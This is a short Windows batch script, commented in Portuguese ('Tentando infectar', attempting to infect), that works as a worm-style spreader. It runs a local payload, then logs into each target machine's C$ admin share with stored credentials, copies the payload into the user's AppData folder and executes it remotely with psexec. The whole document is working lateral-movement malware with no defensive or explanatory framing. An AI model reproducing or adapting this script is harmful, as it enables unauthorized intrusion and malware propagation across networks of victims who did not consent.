@echo off
setlocal

set USER=
set PASS=
set PAYLOAD=payload.bat
set TARGETS=

cmd /c payload.bat
for %%I in (%TARGETS%) do (
    echo [*] Tentando infectar %%I...

    net use \\%%I\C$ /user:%USER% %PASS% >nul 2>&1
    if %errorlevel%==0 (
        echo [+] Acesso à máquina %%I com sucesso.

        copy %PAYLOAD% \\%%I\C$\Users\%USER%\AppData\Roaming\payload.bat
        echo [+] Payload copiado para %%I.

        psexec.exe -i -h \\%%I -u %USER% -p %PASS% cmd /c C:\Users\%USER%\AppData\Roaming\payload.bat
        echo [+] Payload executado em %%I!
    ) else (
        echo [-] Falha ao conectar em %%I.
    )

    net use \\%%I\C$ /delete >nul 2>&1
)

endlocal
